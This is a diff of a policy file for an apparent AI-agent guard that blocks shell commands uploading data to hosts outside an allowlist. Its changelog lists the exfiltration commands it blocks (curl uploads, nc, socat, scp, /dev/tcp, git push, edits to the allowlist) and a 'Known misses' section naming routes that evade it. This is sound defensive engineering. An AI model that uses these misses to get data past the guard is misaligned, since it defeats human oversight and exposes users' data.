@@ -1,18 +1,13 @@
 id: block-unapproved-egress
 name: "Block Unapproved Egress"
-version: "0.1.1"
-description: >
-  Best-effort guard on the tool channel: curl, wget or iwr/irm (Invoke-WebRequest/RestMethod) that
-  UPLOADS (POST/PUT/PATCH, -d/--data*/--json, -F/--form, -T/--upload-file, wget --post-*/--body-*,
-  -Body/-InFile/-Form) to a host outside the allowlist (registries, code hosts, localhost; exact
-  or .suffix match). Fetch-only passes; curl -K/--config is refused. No pragma bypass: ask a
-  person. A floor, not a sandbox: ~/.curlrc, obfuscation, other clients, runtimes.
+version: "0.2.1"
+description: "Best-effort guard on the tool channel: blocks sending data to a host outside the allowlist (.chock/egress-allowlist.txt, else a built-in registry list): curl/wget/iwr uploads, nc/socat/telnet, scp/rsync/sftp, ssh commands, aws/gsutil/az uploads, git push|remote add URLs, $(..)/$VAR in a URL or host. Asks on interpreter HTTP one-liners, gh gist/--body-file, curl --proxy/--resolve/Host:. Blocks ~/.curlrc writes. A floor, not a sandbox: other clients, runtimes, obfuscation."
 artifact: rule
 enforcement: advise
 rule:
   text: |
-    block(egress): fetch(curl|wget|iwr|irm) + upload(-d|--data*|--json|-F|-T|--upload-file|-X POST|PUT|PATCH|-Body|-InFile) to host NOT in allowlist; curl -K|--config refused
-    allow: fetch_only(GET), allowlisted_host(github|pypi|npm|...); floor_not_sandbox; no marker or pragma passes: ask_person
+    block(egress): curl|wget|iwr upload, nc|socat|telnet, scp|rsync|sftp, ssh host cmd, aws s3|gsutil|az blob, git push|remote add <url> to host NOT in .chock/egress-allowlist.txt (default: registries); $(..)|$VAR in URL or hostname; write ~/.curlrc|~/.wgetrc; unusable allowlist file = refuse; curl -K refused
+    ask: interpreter HTTP one-liner, gh gist|--body-file, curl --proxy|--resolve|Host:. allow: GET, allowlisted host, git push origin; floor_not_sandbox; no pragma passes: ask_person
 effects:
 - read_only
 approval:
@@ -31,7 +26,7 @@ compliance:
 provenance:
   author: "chock-core"
   created_at: "2026-08-26T00:00:00Z"
-  updated_at: "2026-09-30T00:00:00Z"
+  updated_at: "2026-10-02T00:00:00Z"
   source_repo: "https://github.com/open-coder-ai/chock-catalog"
   license: "Apache-2.0"
   trust_tier: "community"
@@ -45,6 +40,21 @@ security:
   content_instructions: never-obey
 
 changelog:
+- version: 0.2.1
+  date: '2026-10-03'
+  changes:
+  - "The shared command reader (chock_shellparse, the same copy in every Python guard) changed: it skips a `--` and the shell options between `-c` and the script (`bash -c -- '...'`, `sh -c -x '...'`, `eval -- '...'`), reads `name=(...)`, `name+=` and `name[i]=` assignments, looks through the `{` that opens a function body or group, splits a line whose quotes do not balance in one pass, and in a short-option cluster every `o` or `O` takes the next word (`bash -co pipefail '...'`, `-Oc extglob`) while a lone `-` or `+` ends the options. What this policy refuses is otherwise unchanged; it now also judges the command inside those forms. See protect-agent-config 0.2.7."
+- version: 0.2.0
+  date: '2026-10-02'
+  changes:
+  - "Allowlist moved out of the guard into data. Built-in default: implementations/data/egress-allowlist.txt. A project file `.chock/egress-allowlist.txt` replaces it whole (one host per line, '#' comments; `example.com` is that host only, `*.example.com` its subdomains only, so list both for both; IPv4 as a plain dotted quad; no CIDR, no path). A missing file means the default; an unreadable, binary, malformed or empty file refuses every upload and says why (fail closed), and leaves other commands alone. The file is found from the working directory upward to the nearest .chock/ or .git. Shared with the NP17 MCP-argument guard, which reads the same format."
+  - "Behaviour change: github.com and storage.googleapis.com are no longer upload hosts (an attacker's repository, gist or bucket lives there); api.github.com stays. `curl -d @f https://github.com/...` and `git push https://github.com/...` now block until a person adds the host to the file. Matching is exact or `*.` subdomains, not suffix text, so `evilpypi.org` never matches `pypi.org`."
+  - "Hosts are normalised before matching (case, trailing dot, percent-encoding, punycode/IDN, userinfo and port stripped). A host that cannot be read one way (decimal, octal or hex IPv4, a backslash, a second @, a lookalike script mix) is treated as not allowlisted and blocked."
+  - "New blocks: nc/ncat/telnet/socat to a host outside the allowlist (nc -z and -l pass); openssl s_client -connect with a redirected file; scp/rsync with a remote destination, sftp/ftp to a host; ssh host with a remote command; aws s3 cp|sync|mv to s3://, gsutil/gcloud storage cp|rsync|mv to gs://, az storage upload; git push <url> and git remote add|set-url <name> <url> outside the allowlist (git push origin passes; ext:: transports block); a command or variable substitution in a URL host (any host) or in the path or query of a non-allowlisted host; the same in the name given to ping, nslookup, dig, host, traceroute, mtr; a backtick substitution on a network command line; writes to ~/.curlrc, ~/.wgetrc and .chock/egress-allowlist.txt through redirect, tee, cp, sed -i and the other write verbs."
+  - "New asks (exit 3): python, node, ruby, perl, php one-liners or heredocs that use requests, urllib, http.client, fetch, axios, Net::HTTP, sockets; gh gist create and gh issue|pr create|comment with --body-file or -F; curl --proxy/-x, --resolve, --connect-to, a Host: header; ssh to a host outside the allowlist with no command; ping or curl to a host that is a whole variable; openssl s_client to a host outside the allowlist with nothing redirected."
+  - "Every segment of a chain (; && || | newline, bash -c, subshells) is judged, so an allowlisted command or fetch before a network verb excuses nothing."
+  - "Review fixes: every $(...) and backtick body, here-string and heredoc fed to a shell, and every find -exec command is judged as a command line of its own; /dev/tcp and /dev/udp redirects are sockets to that host; a write to any file named egress-allowlist.txt, ~/.curlrc or ~/.wgetrc (redirect, tee, cp, sed -i, curl -o, wget -O, tar -C, cp -t, an interpreter's open()) or a copy into .chock/ is refused; a URL, scp target or git remote given only as a variable is not trusted; unambiguous long-option prefixes (--upl, --js, --post-fi) and PowerShell abbreviations (-me, -bo) are read; the outermost .chock/egress-allowlist.txt above the working directory decides, so a nested .chock cannot replace the list; rm or mv of .chock and editors, awk, patch, ln or sed w on the allowlist file are refused; a variable in a port is not data in a host; a secret, command or @file in a header sent to a host outside the allowlist asks."
+  - "Known misses, probed and documented: a pipe into nc or openssl s_client is not seen as input (nc to an unapproved host blocks regardless; s_client asks); ~/.curlrc, CURL_HOME and .netrc already on disk; clients and runtimes not listed (rclone, azcopy, busybox, python scripts run from a file); wrappers the shared parser does not unwrap (env -S, su -c, flock, watch, strace, docker exec, kubectl exec, ssh host 'cmd', a function body written `f(){ ...;}`, a command inside git -c credential.helper or ssh -o ProxyCommand); a script piped into a shell is read only from its quoted strings and heredoc body; a variable or substitution naming a redirect target, and hard or symbolic links made earlier; PowerShell -CustomMethod and one-letter parameters; dotless bare hosts (`curl -d x evil`); DNS exfiltration through other tools; cloud buckets cannot be allowlisted by name; api.github.com stays allowlisted, so a token can still publish an issue or gist there; a GET with a variable in the path of a non-allowlisted host (version-pinned downloads) blocks by design; very long adversarial input parses slowly (seconds); the Write/Edit tools can still edit .chock/egress-allowlist.txt until protect-agent-config lists it (follow-up)."
 - version: 0.1.1
   date: '2026-09-30'
   changes:
